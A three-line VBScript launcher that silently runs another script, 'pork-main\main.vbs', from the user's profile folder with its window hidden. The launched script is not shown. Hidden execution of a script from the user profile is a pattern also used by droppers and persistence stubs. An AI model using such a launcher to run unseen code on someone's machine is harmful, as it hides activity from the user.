Set WshShell = CreateObject("WScript.Shell")
userProfile = WshShell.ExpandEnvironmentStrings( "%userprofile%" )
cmds=WshShell.RUN(userProfile & "\pork-main\main.vbs",0,false)
	
